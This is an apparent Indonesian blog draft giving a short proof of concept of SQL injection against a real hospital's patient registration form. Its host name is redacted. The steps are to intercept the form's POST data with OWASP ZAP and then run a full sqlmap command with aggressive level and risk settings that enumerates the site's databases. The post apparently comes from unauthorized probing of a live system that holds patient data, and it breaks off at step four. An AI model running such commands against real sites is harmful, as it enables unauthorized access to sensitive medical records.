---
title: "SQL Injection Form Pendaftaran Rumah Sakit"
date: 2023-12-28T13:39:57+07:00
draft: true
---
Saat akan daftar disalah satu rumah sakit tiba tiba kepikiran bisa gak sih form iin di inject?
# POC
1. Buka form pendaftaran, isikan dengan random data
![Form login](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/1.png)

2. Intercept post data dengan OWASP ZAP
![POST data](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/2.png)

3.  Setelah itu coba dengan sqlmap 
```
sqlmap -u https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=Halo&tgllahir=2025-05-07&nik=9827982798279827&search=nomrm&tglperiksa=2023-12-07" --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --dbs --threads 2
```

![Database name](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/3.png)


4.
